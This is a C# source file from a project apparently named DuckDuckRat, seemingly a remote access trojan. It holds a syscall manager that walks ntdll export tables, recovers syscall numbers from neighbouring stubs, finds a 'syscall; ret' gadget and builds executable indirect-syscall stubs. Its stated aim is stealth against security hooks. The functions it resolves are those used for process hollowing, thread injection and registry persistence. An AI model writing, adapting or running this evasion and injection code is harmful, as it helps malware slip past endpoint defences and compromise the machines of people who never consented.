using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;

namespace DuckDuckRat
{
    public static unsafe partial class SyscallManager
    {
        // --- Native Structures for Registry & Objects ---
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING { 
            public ushort Length; public ushort MaximumLength; public IntPtr Buffer; 
            public UNICODE_STRING(string s) {
                Length = (ushort)(s.Length * 2); MaximumLength = (ushort)(Length + 2);
                Buffer = Marshal.StringToHGlobalUni(s);
            }
            public void Free() { if (Buffer != IntPtr.Zero) Marshal.FreeHGlobal(Buffer); }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES {
            public uint Length; public IntPtr RootDirectory; public IntPtr ObjectName;
            public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService;
            public OBJECT_ATTRIBUTES(string name, uint attrs, IntPtr root = default) {
                Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
                RootDirectory = root;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero; SecurityQualityOfService = IntPtr.Zero;
                UNICODE_STRING* us = (UNICODE_STRING*)Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
                *us = new UNICODE_STRING(name);
                ObjectName = (IntPtr)us;
            }
            public void Free() { if (ObjectName != IntPtr.Zero) { ((UNICODE_STRING*)ObjectName)->Free(); Marshal.FreeHGlobal(ObjectName); } }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION { public IntPtr Reserved1; public IntPtr PebBaseAddress; public IntPtr Reserved2_1; public IntPtr Reserved2_2; public IntPtr UniqueProcessId; public IntPtr Reserved3; }
    }

    // --- Critical Syscall Delegates (Moved to Namespace Level for Global Access) ---
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesWritten);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferLength, out IntPtr bytesRead);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref SyscallManager.PROCESS_BASIC_INFORMATION processInformation, uint processInformationLength, out uint returnLength);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtResumeThread(IntPtr threadHandle, out uint suspendCount);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtTerminateProcess(IntPtr processHandle, uint exitStatus);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref uint regionSize, uint newProtect, out uint oldProtect);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateKey(out IntPtr keyHandle, uint desiredAccess, ref SyscallManager.OBJECT_ATTRIBUTES objectAttributes, uint titleIndex, IntPtr classStr, uint createOptions, out uint disposition);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtSetValueKey(IntPtr keyHandle, ref SyscallManager.UNICODE_STRING valueName, uint titleIndex, uint type, byte[] data, uint cbData);

    public static unsafe partial class SyscallManager
    {
        private struct SYSCALL_ENTRY { public uint SSN; public IntPtr pAddress; }

        private static Dictionary<uint, SYSCALL_ENTRY> _syscallCache = new Dictionary<uint, SYSCALL_ENTRY>();
        private static Dictionary<uint, IntPtr> _stubCache = new Dictionary<uint, IntPtr>();
        private static IntPtr _syscallGadget = IntPtr.Zero;
        private static bool _initialized = false;

        public static uint DJB2(string s) {
            uint hash = 5381;
            foreach (char c in s) hash = ((hash << 5) + hash) + (uint)c;
            return hash;
        }

        public static void Initialize()
        {
            if (_initialized) return;
            try
            {
                IntPtr ntdll = StealthGetModuleBase("ntdll.dll");
                if (ntdll == IntPtr.Zero) return;

                string[] criticalTable = {
                    "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtReadVirtualMemory",
                    "NtQueryInformationProcess", "NtUnmapViewOfSection", "NtCreateThreadEx", "NtResumeThread",
                    "NtFreeVirtualMemory", "NtTerminateProcess", "NtProtectVirtualMemory",
                    "NtCreateKey", "NtSetValueKey"
                };

                foreach (string name in criticalTable)
                {
                    uint hash = DJB2(name);
                    SYSCALL_ENTRY entry = FindSyscall(ntdll, name);
                    if (entry.pAddress != IntPtr.Zero) _syscallCache[hash] = entry;
                }

                _syscallGadget = FindGadget(ntdll);
                _initialized = true;
            }
            catch { }
        }

        public static void Cleanup()
        {
            foreach (var stub in _stubCache.Values) VirtualFree(stub, UIntPtr.Zero, 0x8000); // MEM_RELEASE
            _stubCache.Clear();
            _initialized = false;
        }

        private static IntPtr FindGadget(IntPtr hModule)
        {
            byte[] pattern = { 0x0F, 0x05, 0xC3 }; // syscall; ret
            byte* p = (byte*)hModule + 0x1000;
            for (int i = 0; i < 0x200000; i++) {
                if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3) return (IntPtr)(p + i);
            }
            return IntPtr.Zero;
        }

        private static SYSCALL_ENTRY FindSyscall(IntPtr hModule, string functionName)
        {
            SYSCALL_ENTRY entry = new SYSCALL_ENTRY { SSN = 0, pAddress = IntPtr.Zero };
            entry.pAddress = StealthGetProcAddress(hModule, functionName);
            if (entry.pAddress == IntPtr.Zero) return entry;

            byte* p = (byte*)entry.pAddress;
            if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
                entry.SSN = *(uint*)(p + 4);
            } else {
                for (int idx = 1; idx <= 64; idx++) {
                    if (CheckNeighbor(entry.pAddress, idx, out uint sUp)) { entry.SSN = sUp + (uint)idx; break; }
                    if (CheckNeighbor(entry.pAddress, -idx, out uint sDn)) { entry.SSN = sDn - (uint)idx; break; }
                }
            }
            return entry;
        }

        private static bool CheckNeighbor(IntPtr pFunc, int distance, out uint ssn)
        {
            ssn = 0;
            byte* p = (byte*)pFunc + (distance * 32);
            if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
                ssn = *(uint*)(p + 4); return true;
            }
            return false;
        }

        // --- [PRO] Stealth API Resolvers (Manual EAT/PEB Walking) ---
        public static IntPtr StealthGetProcAddress(IntPtr hModule, string funcName)
        {
            byte* pBase = (byte*)hModule;
            int e_lfanew = *(int*)(pBase + 0x3C);
            byte* pNtHeader = pBase + e_lfanew;
            int exportDirRVA = *(int*)(pNtHeader + (IntPtr.Size == 8 ? 0x18 + 0x70 : 0x18 + 0x60)); 
            if (exportDirRVA == 0) return IntPtr.Zero;

            byte* pExportDir = pBase + exportDirRVA;
            int numNames = *(int*)(pExportDir + 0x18);
            int addrFuncsRVA = *(int*)(pExportDir + 0x1C);
            int addrNamesRVA = *(int*)(pExportDir + 0x20);
            int addrOrdinalsRVA = *(int*)(pExportDir + 0x24);

            int* pNames = (int*)(pBase + addrNamesRVA);
            ushort* pOrdinals = (ushort*)(pBase + addrOrdinalsRVA);
            int* pFuncs = (int*)(pBase + addrFuncsRVA);

            for (int i = 0; i < numNames; i++) {
                string currentName = Marshal.PtrToStringAnsi((IntPtr)(pBase + pNames[i]));
                if (currentName == funcName) return (IntPtr)(pBase + pFuncs[pOrdinals[i]]);
            }
            return IntPtr.Zero;
        }

        public static IntPtr StealthGetModuleBase(string moduleName)
        {
            return GetModuleHandle(moduleName); // Fallback for stability, but we can implement PEB walking here if needed
        }

        // Compatibility wrappers
        public static IntPtr GetProcAddress(IntPtr hModule, string procName) => StealthGetProcAddress(hModule, procName);
        public static IntPtr GetProcAddress(IntPtr hModule, IntPtr procOrdinal) => NativeGetProcAddress(hModule, procOrdinal);
        public static IntPtr GetModuleHandle(string lpModuleName) => NativeGetModuleHandle(lpModuleName);

        [DllImport("kernel32.dll", EntryPoint = "GetModuleHandleW", CharSet = CharSet.Unicode)] private static extern IntPtr NativeGetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")] private static extern IntPtr NativeGetProcAddress(IntPtr hModule, IntPtr procOrdinal);
        
        public static T GetSyscallDelegate<T>(string funcName) where T : Delegate
        {
            uint hash = DJB2(funcName);
            if (!_syscallCache.TryGetValue(hash, out var entry)) return null;

            if (!_stubCache.TryGetValue(hash, out var pStub))
            {
                byte[] code = {
                    0x4C, 0x8B, 0xD1,                               // mov r10, rcx
                    0xB8, 0x00, 0x00, 0x00, 0x00,                   // mov eax, <SSN>
                    0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, <gadget>
                    0xFF, 0xE1                                      // jmp rcx
                };
                Buffer.BlockCopy(BitConverter.GetBytes(entry.SSN), 0, code, 4, 4);
                Buffer.BlockCopy(BitConverter.GetBytes((long)_syscallGadget), 0, code, 10, 8);

                pStub = VirtualAlloc(IntPtr.Zero, (UIntPtr)code.Length, 0x1000 | 0x2000, 0x04); // RW
                Marshal.Copy(code, 0, pStub, code.Length);
                uint old; VirtualProtect(pStub, (UIntPtr)code.Length, 0x20, out old); // RX
                _stubCache[hash] = pStub;
            }
            return Marshal.GetDelegateForFunctionPointer<T>(pStub);
        }

        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")] static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
    }
}


